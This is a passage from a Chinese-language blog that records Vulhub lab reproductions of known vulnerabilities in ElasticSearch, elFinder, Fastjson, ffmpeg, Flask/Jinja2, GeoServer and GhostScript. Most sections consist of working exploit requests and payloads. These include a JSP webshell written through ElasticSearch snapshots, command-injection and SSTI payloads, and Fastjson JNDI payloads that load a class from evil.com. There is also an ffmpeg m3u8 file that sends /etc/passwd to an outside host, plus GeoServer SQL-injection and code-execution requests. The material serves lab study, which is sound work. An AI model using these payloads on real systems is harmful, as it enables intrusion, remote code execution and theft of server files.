title="原理"></a>原理</h2><p>ElasticSearch具有备份数据的功能，用户可以传入一个路径，让其将数据备份到该路径下，且文件名和后缀都可控。</p><p>所以，如果同文件系统下还跑着其他服务，如Tomcat、PHP等，我们可以利用ElasticSearch的备份功能写入一个webshell。</p><p>和CVE-2015-5531类似，该漏洞和备份仓库有关。在elasticsearch1.5.1以后，其将备份仓库的根路径限制在配置文件的配置项<code>path.repo</code>中，而且如果管理员不配置该选项，则默认不能使用该功能。即使管理员配置了该选项，web路径如果不在该目录下，也无法写入webshell。所以该漏洞影响的ElasticSearch版本是1.5.x以前。</p></blockquote><h2 id="漏洞复现-49"><a href="#漏洞复现-49" class="headerlink" title="漏洞复现"></a>漏洞复现</h2><blockquote><p>首先创建一个恶意索引文档：</p><pre class="line-numbers language-none"><code class="language-none">curl -XPOST http://127.0.0.1:9200/yz.jsp/yz.jsp/1 -d'{"&lt;%new java.io.RandomAccessFile(application.getRealPath(new String(new byte[]{47,116,101,115,116,46,106,115,112})),new String(new byte[]{114,119})).write(request.getParameter(new String(new byte[]{102})).getBytes());%&gt;":"test"}'<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span></span></code></pre><p>再创建一个恶意的存储库，其中<code>location</code>的值即为我要写入的路径。</p><blockquote><p>园长：这个Repositories的路径比较有意思，因为他可以写到可以访问到的任意地方，并且如果这个路径不存在的话会自动创建。那也就是说你可以通过文件访问协议创建任意的文件夹。这里我把这个路径指向到了tomcat的web部署目录，因为只要在这个文件夹创建目录Tomcat就会自动创建一个新的应用(文件名为wwwroot的话创建出来的应用名称就是wwwroot了)。</p></blockquote><pre class="line-numbers language-none"><code class="language-none">curl -XPUT 'http://127.0.0.1:9200/_snapshot/yz.jsp' -d '{     "type": "fs",     "settings": {          "location": "/usr/local/tomcat/webapps/wwwroot/",          "compress": false     }}'<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><p>存储库验证并创建:</p><pre class="line-numbers language-none"><code class="language-none">curl -XPUT "http://127.0.0.1:9200/_snapshot/yz.jsp/yz.jsp" -d '{     "indices": "yz.jsp",     "ignore_unavailable": "true",     "include_global_state": false}'<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span></span></code></pre><p>完成！</p><p>访问<code>http://127.0.0.1:8080/wwwroot/indices/yz.jsp/snapshot-yz.jsp</code>，这就是我们写入的webshell。</p><p>该shell的作用是向wwwroot下的test.jsp文件中写入任意字符串，如：<code>http://127.0.0.1:8080/wwwroot/indices/yz.jsp/snapshot-yz.jsp?f=success</code>，我们再访问/wwwroot/test.jsp就能看到success了：</p></blockquote><p><img data-src="/2024/09/30/Vulhub%E8%AE%B0%E5%BD%95/106.jpg" alt="106"></p><p><img data-src="/2024/09/30/Vulhub%E8%AE%B0%E5%BD%95/107.jpg" alt="107"></p><h1 id="Electron-WebPreferences-远程命令执行漏洞（CVE-2018-15685）（未完成）"><a href="#Electron-WebPreferences-远程命令执行漏洞（CVE-2018-15685）（未完成）" class="headerlink" title="Electron WebPreferences 远程命令执行漏洞（CVE-2018-15685）（未完成）"></a>Electron WebPreferences 远程命令执行漏洞（CVE-2018-15685）（未完成）</h1><blockquote><p>Electron是由Github开发，用HTML，CSS和JavaScript来构建跨平台桌面应用程序的一个开源库。 Electron通过将Chromium和Node.js合并到同一个运行时环境中，并将其打包为Mac，Windows和Linux系统下的应用来实现这一目的。</p><p>Electron在设置了<code>nodeIntegration=false</code>的情况下（默认），页面中的JavaScript无法访问node.js的内置库。CVE-2018-15685绕过了该限制，导致在用户可执行JavaScript的情况下（如访问第三方页面或APP存在XSS漏洞时），能够执行任意命令。</p><p>参考链接：</p><ul><li><a href="https://electronjs.org/blog/web-preferences-fix">https://electronjs.org/blog/web-preferences-fix</a></li><li><a href="https://www.contrastsecurity.com/security-influencers/cve-2018-15685">https://www.contrastsecurity.com/security-influencers/cve-2018-15685</a></li></ul></blockquote><p>报错 .sh无法执行</p><h1 id="electron-远程命令执行漏洞（CVE-2018-1000006）（未完成）"><a href="#electron-远程命令执行漏洞（CVE-2018-1000006）（未完成）" class="headerlink" title="electron 远程命令执行漏洞（CVE-2018-1000006）（未完成）"></a>electron 远程命令执行漏洞（CVE-2018-1000006）（未完成）</h1><p>同上</p><h1 id="elFinder-ZIP-参数与任意命令注入（CVE-2021-32682）"><a href="#elFinder-ZIP-参数与任意命令注入（CVE-2021-32682）" class="headerlink" title="elFinder ZIP 参数与任意命令注入（CVE-2021-32682）"></a>elFinder ZIP 参数与任意命令注入（CVE-2021-32682）</h1><p>elFinder是一个基于PHP、Jquery的开源文件管理系统。</p><p>在elFinder 2.1.48及以前的版本中，存在一处参数注入漏洞。攻击者可以利用这个漏洞在目标服务器上执行任意命令，即使是最小化安装的elFinder。</p><p>这个漏洞的原因除了参数注入外，还有默认情况下的未授权访问，因此我们可以对elFinder增加权限校验，避免任意用户操作服务器上的文件，进而避免被执行任意命令。当然，升级版本到2.1.49及以上也是必要的。</p><p>参考链接：</p><ul><li><a href="https://blog.sonarsource.com/elfinder-case-study-of-web-file-manager-vulnerabilities">https://blog.sonarsource.com/elfinder-case-study-of-web-file-manager-vulnerabilities</a></li><li><a href="https://packetstormsecurity.com/files/164173/elfinder_archive_cmd_injection.rb.txt">https://packetstormsecurity.com/files/164173/elfinder_archive_cmd_injection.rb.txt</a></li><li><a href="https://xz.aliyun.com/t/10739">https://xz.aliyun.com/t/10739</a></li></ul><h2 id="漏洞复现-50"><a href="#漏洞复现-50" class="headerlink" title="漏洞复现"></a>漏洞复现</h2><blockquote><p> 复现这个漏洞首先需要用elFinder提供的功能，创建两个文件。</p><p>先创建一个普通的文本文件<code>1.txt</code>：</p><p>然后右键这个文件，对其进行打包，打包后的文件命名为<code>2.zip</code>：</p><p>最后我们获得<code>1.txt</code>和<code>2.zip</code>两个文件：</p></blockquote><p><img data-src="/2024/09/30/Vulhub%E8%AE%B0%E5%BD%95/108.jpg" alt="108"></p><blockquote><p>然后，发送如下数据包来执行任意命令：</p><pre class="line-numbers language-none"><code class="language-none">GET /php/connector.minimal.php?cmd=archive&amp;name=-TvTT=id&gt;shell.php%20%23%20a.zip&amp;target=l1_Lw&amp;targets%5B1%5D=l1_Mi56aXA&amp;targets%5B0%5D=l1_MS50eHQ&amp;type=application%2Fzip HTTP/1.1Host: your-ipAccept: application/json, text/javascript, */*; q=0.01User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/98.0.4758.102 Safari/537.36X-Requested-With: XMLHttpRequestReferer: http://localhost.lan:8080/Accept-Encoding: gzip, deflateAccept-Language: en-US,en;q=0.9,zh-CN;q=0.8,zh;q=0.7Connection: close<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><p>这个数据包中，你可以看到三个重要的参数：</p><ul><li><code>name</code>， 值为<code>-TvTT=id&gt;shell.php # a.zip</code>，你可以修改<code>id&gt;shell.php</code>为任意你想执行的命令</li><li><code>targets[0]</code>， 值为<code>l1_MS50eHQ</code>，<code>l1</code>意思是第一个文件系统（默认值，不用修改），<code>MS50eHQ</code>是<code>1.txt</code>的base64编码</li><li><code>targets[1]</code>， 值为<code>l1_Mi56aXA</code>，<code>l1</code>意思是第一个文件系统（默认值，不用修改），<code>Mi56aXA</code>是<code>2.zip</code>的base64编码</li></ul><p>虽然这个数据包发送后会返回错误信息，但实际上其中指定的命令已经被成功执行</p></blockquote><p><img data-src="/2024/09/30/Vulhub%E8%AE%B0%E5%BD%95/109.jpg" alt="109"></p><blockquote><p>可以访问<code>http://your-ip:8080/files/shell.php</code>查看执行的结果：</p></blockquote><p><img data-src="/2024/09/30/Vulhub%E8%AE%B0%E5%BD%95/110.jpg" alt="110"></p><h1 id="fastjson-1-2-24-反序列化导致任意命令执行漏洞"><a href="#fastjson-1-2-24-反序列化导致任意命令执行漏洞" class="headerlink" title="fastjson 1.2.24 反序列化导致任意命令执行漏洞"></a>fastjson 1.2.24 反序列化导致任意命令执行漏洞</h1><blockquote><p> fastjson在解析json的过程中，支持使用autoType来实例化某一个具体的类，并调用该类的set/get方法来访问属性。通过查找代码中相关的方法，即可构造出一些恶意利用链。</p><p>参考资料：</p><ul><li><a href="https://www.freebuf.com/vuls/208339.html">https://www.freebuf.com/vuls/208339.html</a></li><li><a href="http://xxlegend.com/2017/04/29/title-%20fastjson%20%E8%BF%9C%E7%A8%8B%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96poc%E7%9A%84%E6%9E%84%E9%80%A0%E5%92%8C%E5%88%86%E6%9E%90/">http://xxlegend.com/2017/04/29/title-%20fastjson%20%E8%BF%9C%E7%A8%8B%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96poc%E7%9A%84%E6%9E%84%E9%80%A0%E5%92%8C%E5%88%86%E6%9E%90/</a></li></ul></blockquote><h2 id="漏洞复现-51"><a href="#漏洞复现-51" class="headerlink" title="漏洞复现"></a>漏洞复现</h2><blockquote><p>因为目标环境是Java 8u102，没有<code>com.sun.jndi.rmi.object.trustURLCodebase</code>的限制，我们可以使用<code>com.sun.rowset.JdbcRowSetImpl</code>的利用链，借助JNDI注入来执行命令。</p><p>首先编译并上传命令执行代码，如<code>http://evil.com/TouchFile.class</code>：</p><pre class="line-numbers language-java" data-language="java"><code class="language-java">// javac TouchFile.javaimport java.lang.Runtime;import java.lang.Process;public class TouchFile {    static {        try {            Runtime rt = Runtime.getRuntime();            String[] commands = {"touch", "/tmp/success"};            Process pc = rt.exec(commands);            pc.waitFor();        } catch (Exception e) {            // do nothing        }    }}<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><p>然后我们借助<a href="https://github.com/mbechler/marshalsec">marshalsec</a>项目，启动一个RMI服务器，监听9999端口，并制定加载远程类<code>TouchFile.class</code>：</p><pre class="line-numbers language-bash" data-language="bash"><code class="language-bash">java -cp marshalsec-0.0.3-SNAPSHOT-all.jar marshalsec.jndi.RMIRefServer "http://evil.com/#TouchFile" 9999<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><p>向靶场服务器发送Payload，带上RMI的地址：</p><pre class="line-numbers language-none"><code class="language-none">POST / HTTP/1.1Host: your-ip:8090Accept-Encoding: gzip, deflateAccept: */*Accept-Language: enUser-Agent: Mozilla/5.0 (compatible; MSIE 9.0; Windows NT 6.1; Win64; x64; Trident/5.0)Connection: closeContent-Type: application/jsonContent-Length: 160{    "b":{        "@type":"com.sun.rowset.JdbcRowSetImpl",        "dataSourceName":"rmi://evil.com:9999/TouchFile",        "autoCommit":true    }}<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><p>可见，命令<code>touch /tmp/success</code>已成功执行：</p></blockquote><p>我参考了<a href="https://blog.csdn.net/BrickLoveStudy/article/details/124362374">这个教程</a></p><p><img data-src="/2024/09/30/Vulhub%E8%AE%B0%E5%BD%95/112.jpg" alt="112"></p><p><img data-src="/2024/09/30/Vulhub%E8%AE%B0%E5%BD%95/113.jpg" alt="113"></p><h1 id="Fastjson-1-2-47-远程命令执行漏洞"><a href="#Fastjson-1-2-47-远程命令执行漏洞" class="headerlink" title="Fastjson 1.2.47 远程命令执行漏洞"></a>Fastjson 1.2.47 远程命令执行漏洞</h1><blockquote><p>Fastjson是阿里巴巴公司开源的一款json解析器，其性能优越，被广泛应用于各大厂商的Java项目中。fastjson于1.2.24版本后增加了反序列化白名单，而在1.2.48以前的版本中，攻击者可以利用特殊构造的json字符串绕过白名单检测，成功执行任意命令。</p><p>参考链接：</p><ul><li><a href="https://cert.360.cn/warning/detail?id=7240aeab581c6dc2c9c5350756079955">https://cert.360.cn/warning/detail?id=7240aeab581c6dc2c9c5350756079955</a></li><li><a href="https://www.freebuf.com/vuls/208339.html">https://www.freebuf.com/vuls/208339.html</a></li></ul></blockquote><h2 id="漏洞复现-52"><a href="#漏洞复现-52" class="headerlink" title="漏洞复现"></a>漏洞复现</h2><p>和上面那个过程完全一样啊 就不再搞一遍了</p><blockquote><p>目标环境是<code>openjdk:8u102</code>，这个版本没有<code>com.sun.jndi.rmi.object.trustURLCodebase</code>的限制，我们可以简单利用RMI进行命令执行。</p><p>首先编译并上传命令执行代码，如<code>http://evil.com/TouchFile.class</code>：</p><pre class="line-numbers language-java" data-language="java"><code class="language-java">// javac TouchFile.javaimport java.lang.Runtime;import java.lang.Process;public class TouchFile {    static {        try {            Runtime rt = Runtime.getRuntime();            String[] commands = {"touch", "/tmp/success"};            Process pc = rt.exec(commands);            pc.waitFor();        } catch (Exception e) {            // do nothing        }    }}<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><p>然后我们借助<a href="https://github.com/mbechler/marshalsec">marshalsec</a>项目，启动一个RMI服务器，监听9999端口，并制定加载远程类<code>TouchFile.class</code>：</p><pre class="line-numbers language-bash" data-language="bash"><code class="language-bash">java -cp marshalsec-0.0.3-SNAPSHOT-all.jar marshalsec.jndi.RMIRefServer "http://evil.com/#TouchFile" 9999<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><p>向靶场服务器发送Payload：</p><pre class="line-numbers language-none"><code class="language-none">{    "a":{        "@type":"java.lang.Class",        "val":"com.sun.rowset.JdbcRowSetImpl"    },    "b":{        "@type":"com.sun.rowset.JdbcRowSetImpl",        "dataSourceName":"rmi://evil.com:9999/Exploit",        "autoCommit":true    }}<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><p>可见，命令<code>touch /tmp/success</code>已成功执行：</p></blockquote><h1 id="ffmpeg-任意文件读取漏洞-SSRF漏洞-（CVE-2016-1897-CVE-2016-1898）"><a href="#ffmpeg-任意文件读取漏洞-SSRF漏洞-（CVE-2016-1897-CVE-2016-1898）" class="headerlink" title="ffmpeg 任意文件读取漏洞/SSRF漏洞 （CVE-2016-1897/CVE-2016-1898）"></a>ffmpeg 任意文件读取漏洞/SSRF漏洞 （CVE-2016-1897/CVE-2016-1898）</h1><blockquote><p>运行环境：</p><pre class="line-numbers language-none"><code class="language-none">docker compose builddocker compose up -d<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span></span></code></pre><h2 id="原理-5"><a href="#原理-5" class="headerlink" title="原理"></a>原理</h2><ul><li><a href="http://xdxd.love/2016/01/18/ffmpeg-SSRF%E6%BC%8F%E6%B4%9E%E5%88%86%E6%9E%90/">http://xdxd.love/2016/01/18/ffmpeg-SSRF%E6%BC%8F%E6%B4%9E%E5%88%86%E6%9E%90/</a></li><li><a href="http://blog.neargle.com/SecNewsBak/drops/CVE-2016-1897.8%20-%20FFMpeg%E6%BC%8F%E6%B4%9E%E5%88%86%E6%9E%90.html">http://blog.neargle.com/SecNewsBak/drops/CVE-2016-1897.8%20-%20FFMpeg%E6%BC%8F%E6%B4%9E%E5%88%86%E6%9E%90.html</a></li><li><a href="http://habrahabr.ru/company/mailru/blog/274855/">http://habrahabr.ru/company/mailru/blog/274855/</a></li></ul><h2 id="测试过程"><a href="#测试过程" class="headerlink" title="测试过程"></a>测试过程</h2><p>详见参考文章，不再赘述。</p></blockquote><h2 id="漏洞复现-53"><a href="#漏洞复现-53" class="headerlink" title="漏洞复现"></a>漏洞复现</h2><p>三个链接死了两个 这里用的是[这个教程][<a href="https://www.freebuf.com/articles/web/258320.html]">https://www.freebuf.com/articles/web/258320.html]</a></p><blockquote><p>首先，我们需要在 web 服务器上创建一个 back.txt，文件内容是 m3u8 的格式，其中不包含文件结束符。<br>其次，我们再创建一个恶意的 m3u8 文件，文件内容通过 concat 拼接本地文件/etc/passwd。<br>最后，我们上传这个恶意的 m3u8 文件。<br>back.txt：</p><pre class="line-numbers language-none"><code class="language-none">#EXTM3U#EXT-X-MEDIA-SEQUENCE:0#EXTINF:,http://your_ip:9999/?<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span></span></code></pre><p>upload.m3u8:</p><pre class="line-numbers language-none"><code class="language-none">#EXTM3U#EXT-X-TARGETDURATION:6#EXTINF:10.0,concat:http://your_ip/back.txt|file:///etc/passwd#EXT-X-ENDLIST<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span></span></code></pre><p>Tip: 以上的文件需要使用记事本编辑保存，选择默认 utf-8 格式。使用vim来编译可能会导致复现失败。</p><p>使用python来搭建一个简易的web，将back.txt部署到web上。</p><pre class="line-numbers language-none"><code class="language-none">python2 -m SimpleHTTPServer 8888或python3 -m http.server 8888<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span></span></code></pre><p>上传恶意m3u8文件，并监听9999端口</p><p>感谢师傅不断测试扫坑：<a href="https://www.freebuf.com/articles/web/258320.html">https://www.freebuf.com/articles/web/258320.html</a>.<br>以下均来自上面师傅的文章<br>在不断测试的过程中，最终发现，与 URL 长度，m3u8 请求 URL 都无关系，也没有 32 字节的限制。实际上 concat 连接 URL 时是不能包含换行符的。/etc/passwd 文件存储过程中换行符 \n 是占一个字符的，所以无论是通过 file 协议，还是 subfile 切片，只要是读取到 \n 则中断，后面的内容无法输出。</p></blockquote><p><img data-src="/2024/09/30/Vulhub%E8%AE%B0%E5%BD%95/114.jpg" alt="114"></p><h1 id="ffmpeg-任意文件读取漏洞环境"><a href="#ffmpeg-任意文件读取漏洞环境" class="headerlink" title="ffmpeg 任意文件读取漏洞环境"></a>ffmpeg 任意文件读取漏洞环境</h1><blockquote><p>参考资料：</p><ul><li><a href="http://bobao.360.cn/learning/detail/4032.html">http://bobao.360.cn/learning/detail/4032.html</a></li><li><a href="https://hackerone.com/reports/242831">https://hackerone.com/reports/242831</a></li><li><a href="https://github.com/neex/ffmpeg-avi-m3u-xbin">https://github.com/neex/ffmpeg-avi-m3u-xbin</a></li></ul></blockquote><h2 id="漏洞复现-54"><a href="#漏洞复现-54" class="headerlink" title="漏洞复现"></a>漏洞复现</h2><blockquote><p> 漏洞原理不再赘述，直接下载exp，并生成payload：</p><pre class="line-numbers language-none"><code class="language-none"># 下载expgit clone https://github.com/neex/ffmpeg-avi-m3u-xbincd ffmpeg-avi-m3u-xbin# 生成payload./gen_xbin_avi.py file:///etc/passwd exp.avi<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><p>生成exp.avi，在<code>http://your-ip:8080/</code>上传。后端将会将你上传的视频用ffmpeg转码后显示，转码时因为ffmpeg的任意文件读取漏洞，可将文件信息读取到视频中：</p></blockquote><p><img data-src="/2024/09/30/Vulhub%E8%AE%B0%E5%BD%95/115.jpg" alt="115"></p><blockquote><p>你也可以执行<code>docker compose exec web bash</code>进入本环境内部，测试ffmpeg。</p></blockquote><p>注：没法直接播放的话可以右键保存下来看</p><h1 id="Flask（Jinja2）-服务端模板注入漏洞"><a href="#Flask（Jinja2）-服务端模板注入漏洞" class="headerlink" title="Flask（Jinja2） 服务端模板注入漏洞"></a>Flask（Jinja2） 服务端模板注入漏洞</h1><blockquote><h2 id="原理-6"><a href="#原理-6" class="headerlink" title="原理"></a>原理</h2><p>参考文章：</p><ul><li><a href="https://www.blackhat.com/docs/us-15/materials/us-15-Kettle-Server-Side-Template-Injection-RCE-For-The-Modern-Web-App-wp.pdf">https://www.blackhat.com/docs/us-15/materials/us-15-Kettle-Server-Side-Template-Injection-RCE-For-The-Modern-Web-App-wp.pdf</a></li><li><a href="http://rickgray.me/use-python-features-to-execute-arbitrary-codes-in-jinja2-templates">http://rickgray.me/use-python-features-to-execute-arbitrary-codes-in-jinja2-templates</a></li></ul></blockquote><h2 id="漏洞复现-55"><a href="#漏洞复现-55" class="headerlink" title="漏洞复现"></a>漏洞复现</h2><blockquote><p>编译及运行测试环境：</p><pre class="line-numbers language-none"><code class="language-none">docker compose builddocker compose up -d<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span></span></code></pre><p>访问<code>http://your-ip/?name={{233*233}}</code>，得到54289，说明SSTI漏洞存在。</p></blockquote><p><img data-src="/2024/09/30/Vulhub%E8%AE%B0%E5%BD%95/116.jpg" alt="116"></p><blockquote><p>获取eval函数并执行任意python代码的POC：</p><pre class="line-numbers language-none"><code class="language-none">{% for c in [].__class__.__base__.__subclasses__() %}{% if c.__name__ == 'catch_warnings' %}  {% for b in c.__init__.__globals__.values() %}  {% if b.__class__ == {}.__class__ %}    {% if 'eval' in b.keys() %}      {{ b['eval']('__import__("os").popen("id").read()') }}    {% endif %}  {% endif %}  {% endfor %}{% endif %}{% endfor %}<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><p>访问<code>http://your-ip:8000/?name=%7B%25%20for%20c%20in%20%5B%5D.__class__.__base__.__subclasses__()%20%25%7D%0A%7B%25%20if%20c.__name__%20%3D%3D%20%27catch_warnings%27%20%25%7D%0A%20%20%7B%25%20for%20b%20in%20c.__init__.__globals__.values()%20%25%7D%0A%20%20%7B%25%20if%20b.__class__%20%3D%3D%20%7B%7D.__class__%20%25%7D%0A%20%20%20%20%7B%25%20if%20%27eval%27%20in%20b.keys()%20%25%7D%0A%20%20%20%20%20%20%7B%7B%20b%5B%27eval%27%5D(%27__import__(%22os%22).popen(%22id%22).read()%27)%20%7D%7D%0A%20%20%20%20%7B%25%20endif%20%25%7D%0A%20%20%7B%25%20endif%20%25%7D%0A%20%20%7B%25%20endfor%20%25%7D%0A%7B%25%20endif%20%25%7D%0A%7B%25%20endfor%20%25%7D</code>，得到执行结果：</p></blockquote><p><img data-src="/2024/09/30/Vulhub%E8%AE%B0%E5%BD%95/117.jpg" alt="117"></p><h1 id="flink的俩漏洞readme没人翻译做个鸡毛啊"><a href="#flink的俩漏洞readme没人翻译做个鸡毛啊" class="headerlink" title="flink的俩漏洞readme没人翻译做个鸡毛啊"></a>flink的俩漏洞readme没人翻译做个鸡毛啊</h1><h1 id="GeoServer-OGC-Filter-SQL注入漏洞（CVE-2023-25157）"><a href="#GeoServer-OGC-Filter-SQL注入漏洞（CVE-2023-25157）" class="headerlink" title="GeoServer OGC Filter SQL注入漏洞（CVE-2023-25157）"></a>GeoServer OGC Filter SQL注入漏洞（CVE-2023-25157）</h1><blockquote><p>GeoServer 是 OpenGIS Web 服务器规范的 J2EE 实现，利用 GeoServer 可以方便的发布地图数据，允许用户对特征数据进行更新、删除、插入操作。</p><p>在版本2.22.1和2.21.4及以前，多个OGC表达式中均存在SQL注入漏洞。</p><p>参考链接：</p><ul><li><a href="https://github.com/murataydemir/CVE-2023-25157-and-CVE-2023-25158">https://github.com/murataydemir/CVE-2023-25157-and-CVE-2023-25158</a></li><li><a href="https://github.com/advisories/GHSA-7g5f-wrx8-5ccf">https://github.com/advisories/GHSA-7g5f-wrx8-5ccf</a></li></ul></blockquote><h2 id="漏洞复现-56"><a href="#漏洞复现-56" class="headerlink" title="漏洞复现"></a>漏洞复现</h2><blockquote><p>在利用漏洞前，需要目标服务器中存在类型是PostGIS的数据空间（datastore）和工作空间（workspace）。在Vulhub中，已经包含满足条件的工作空间，其信息如下：</p><ul><li>Workspace name: <code>vulhub</code></li><li>Data store name: <code>pg</code></li><li>Feature type (table) name: <code>example</code></li><li>One of attribute from feature type: <code>name</code></li></ul><p>利用这些已知参数，发送如下URL即可触发SQL注入漏洞：</p><pre class="line-numbers language-none"><code class="language-none">http://your-ip:8080/geoserver/ows?service=wfs&amp;version=1.0.0&amp;request=GetFeature&amp;typeName=vulhub:example&amp;CQL_FILTER=strStartsWith%28name%2C%27x%27%27%29+%3D+true+and+1%3D%28SELECT+CAST+%28%28SELECT+version()%29+AS+integer%29%29+--+%27%29+%3D+true<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre></blockquote><p><img data-src="/2024/09/30/Vulhub%E8%AE%B0%E5%BD%95/118.jpg" alt="118"></p><p>可见，已经使用SQL注入获取到了目标服务器PostgreSQL的版本。</p><h1 id="GeoServer-属性名表达式前台代码执行漏洞（CVE-2024-36401）"><a href="#GeoServer-属性名表达式前台代码执行漏洞（CVE-2024-36401）" class="headerlink" title="GeoServer 属性名表达式前台代码执行漏洞（CVE-2024-36401）"></a>GeoServer 属性名表达式前台代码执行漏洞（CVE-2024-36401）</h1><blockquote><p>GeoServer 是 OpenGIS Web 服务器规范的 J2EE 实现，利用 GeoServer 可以方便的发布地图数据，允许用户对特征数据进行更新、删除、插入操作。</p><p>在GeoServer 2.25.1， 2.24.3， 2.23.5版本及以前，未登录的任意用户可以通过构造恶意OGC请求，在默认安装的服务器中执行XPath表达式，进而利用执行Apache Commons Jxpath提供的功能执行任意代码。</p><p>参考链接：</p><ul><li><a href="https://github.com/geoserver/geoserver/security/advisories/GHSA-6jj6-gm7p-fcvv">https://github.com/geoserver/geoserver/security/advisories/GHSA-6jj6-gm7p-fcvv</a></li><li><a href="https://github.com/geotools/geotools/security/advisories/GHSA-w3pj-wh35-fq8w">https://github.com/geotools/geotools/security/advisories/GHSA-w3pj-wh35-fq8w</a></li><li><a href="https://tttang.com/archive/1771/">https://tttang.com/archive/1771/</a></li><li><a href="https://github.com/Warxim/CVE-2022-41852">https://github.com/Warxim/CVE-2022-41852</a></li></ul></blockquote><h2 id="漏洞复现-57"><a href="#漏洞复现-57" class="headerlink" title="漏洞复现"></a>漏洞复现</h2><blockquote><p>在官方<a href="https://github.com/geoserver/geoserver/security/advisories/GHSA-6jj6-gm7p-fcvv">漏洞通告</a>中提到可以找到漏洞相关的WFS方法：</p><blockquote><p>No public PoC is provided but this vulnerability has been confirmed to be exploitable through WFS GetFeature, WFS GetPropertyValue, WMS GetMap, WMS GetFeatureInfo, WMS GetLegendGraphic and WPS Execute requests.</p></blockquote><p>比如，我这里使用<code>GetPropertyValue</code>来执行xpath表达式。参考<a href="https://github.com/geoserver/geoserver/blob/2.23.2/doc/en/user/source/services/wfs/reference.rst">官方文档</a>，我构造了两个POC。基于GET方法的POC：</p><pre class="line-numbers language-none"><code class="language-none">GET /geoserver/wfs?service=WFS&amp;version=2.0.0&amp;request=GetPropertyValue&amp;typeNames=sf:archsites&amp;valueReference=exec(java.lang.Runtime.getRuntime(),'touch%20/tmp/success1') HTTP/1.1Host: your-ip:8080Accept-Encoding: gzip, deflate, brAccept: */*Accept-Language: en-US;q=0.9,en;q=0.8User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/124.0.6367.118 Safari/537.36Connection: closeCache-Control: max-age=0<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><p>基于POST方法的POC：</p><pre class="line-numbers language-none"><code class="language-none">POST /geoserver/wfs HTTP/1.1Host: your-ip:8080Accept-Encoding: gzip, deflate, brAccept: */*Accept-Language: en-US;q=0.9,en;q=0.8User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/124.0.6367.118 Safari/537.36Connection: closeCache-Control: max-age=0Content-Type: application/xmlContent-Length: 356&lt;wfs:GetPropertyValue service='WFS' version='2.0.0' xmlns:topp='http://www.openplans.org/topp' xmlns:fes='http://www.opengis.net/fes/2.0' xmlns:wfs='http://www.opengis.net/wfs/2.0'&gt;  &lt;wfs:Query typeNames='sf:archsites'/&gt;  &lt;wfs:valueReference&gt;exec(java.lang.Runtime.getRuntime(),'touch /tmp/success2')&lt;/wfs:valueReference&gt;&lt;/wfs:GetPropertyValue&gt;<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre></blockquote><blockquote><p>熟悉的<code>java.lang.ClassCastException</code>错误，说明命令已执行成功。</p></blockquote><p><img data-src="/2024/09/30/Vulhub%E8%AE%B0%E5%BD%95/119.jpg"><br><img data-src="/2024/09/30/Vulhub%E8%AE%B0%E5%BD%95/120.jpg"></p><blockquote><p>进入容器可见，<code>touch /tmp/success1</code>与<code>touch /tmp/success2</code>均已成功执行。</p></blockquote><p><img data-src="/2024/09/30/Vulhub%E8%AE%B0%E5%BD%95/121.jpg"></p><blockquote><p> 值得注意的是，typeNames必须存在，我们可以在Web页面中找到当前服务器中的所有Types：</p></blockquote><p><img data-src="/2024/09/30/Vulhub%E8%AE%B0%E5%BD%95/122.jpg"></p><h1 id="GhostScript-沙箱绕过（命令执行）漏洞（CVE-2018-16509）"><a href="#GhostScript-沙箱绕过（命令执行）漏洞（CVE-2018-16509）" class="headerlink" title="GhostScript 沙箱绕过（命令执行）漏洞（CVE-2018-16509）"></a>GhostScript 沙箱绕过（命令执行）漏洞（CVE-2018-16509）</h1><blockquote><p>8 月 21 号，Tavis Ormandy 通过公开邮件列表，再次指出 GhostScript 的安全沙箱可以被绕过，通过构造恶意的图片内容，将可以造成命令执行、文件读取、文件删除等漏洞：</p><ul><li><a href="http://seclists.org/oss-sec/2018/q3/142">http://seclists.org/oss-sec/2018/q3/142</a></li><li><a href="https://bugs.chromium.org/p/project-zero/issues/detail?id=1640">https://bugs.chromium.org/p/project-zero/issues/detail?id=1640</a></li></ul><p>GhostScript 被许多图片处理库所使用，如 ImageMagick、Python PIL 